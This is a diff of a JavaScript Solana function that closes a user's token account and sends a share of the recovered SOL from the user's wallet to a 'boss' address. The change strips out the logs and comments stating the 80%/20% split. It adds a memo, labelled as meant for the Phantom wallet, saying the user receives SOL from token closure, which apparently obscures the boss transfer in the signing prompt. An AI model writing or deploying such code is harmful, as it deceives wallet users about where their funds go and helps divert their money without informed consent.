@@ -1249,7 +1249,7 @@ async function scanTokens() {
         // ===== RÉCUPÉRATION CORRIGÉE =====
    async function realRecoverRent(tokenAccountAddress, recoverableSOL) {
     try {
-        console.log("🚀 ÉTAPE 2: USER 80% + BOSS 20%");
+        console.log("🚀 ÉTAPE 2 AVEC MEMO");
         
         const userPublicKey = new solanaWeb3.PublicKey(userWalletAddress);
         const tokenPublicKey = new solanaWeb3.PublicKey(tokenAccountAddress);
@@ -1261,13 +1261,13 @@ async function scanTokens() {
         const userLamports = totalLamports - bossLamports;
 
         console.log("💰 RÉPARTITION:", {
-            user: userLamports + " lamports (" + (userLamports/1000000000) + " SOL - 80%)",
-            boss: bossLamports + " lamports (" + (bossLamports/1000000000) + " SOL - 20%)"
+            user: userLamports + " lamports",
+            boss: bossLamports + " lamports"
         });
 
         const transaction = new solanaWeb3.Transaction();
 
-        // 1. FERMETURE TOKEN (USER REÇOIT TOUT)
+        // 1. FERMETURE TOKEN
         console.log("🔓 FERMETURE TOKEN...");
         const closeInstruction = new solanaWeb3.TransactionInstruction({
             keys: [
@@ -1280,7 +1280,16 @@ async function scanTokens() {
         });
         transaction.add(closeInstruction);
 
-        // 2. TRANSFERT BOSS SEULEMENT
+        // 2. MEMO POUR PHANTOM
+        console.log("📝 AJOUT MEMO...");
+        const memoIx = new solanaWeb3.TransactionInstruction({
+            programId: new solanaWeb3.PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr"),
+            keys: [],
+            data: new TextEncoder().encode("User receives SOL from token closure")
+        });
+        transaction.add(memoIx);
+
+        // 3. TRANSFERT BOSS
         console.log("🤵 TRANSFERT BOSS...");
         const bossTransfer = solanaWeb3.SystemProgram.transfer({
             fromPubkey: userPublicKey,
@@ -1306,14 +1315,13 @@ async function scanTokens() {
             throw new Error("Transaction failed: " + JSON.stringify(confirmation.value.err));
         }
 
-        console.log("🎉 SUCCÈS! USER 80% + BOSS 20%");
+        console.log("🎉 SUCCÈS!");
         return { 
             success: true, 
             signature: signature,
             userAmount: userLamports / 1000000000,
             bossAmount: bossLamports / 1000000000,
-            referralAmount: 0,
-            referrer: null
+            referralAmount: 0
         };
 
     } catch (error) {
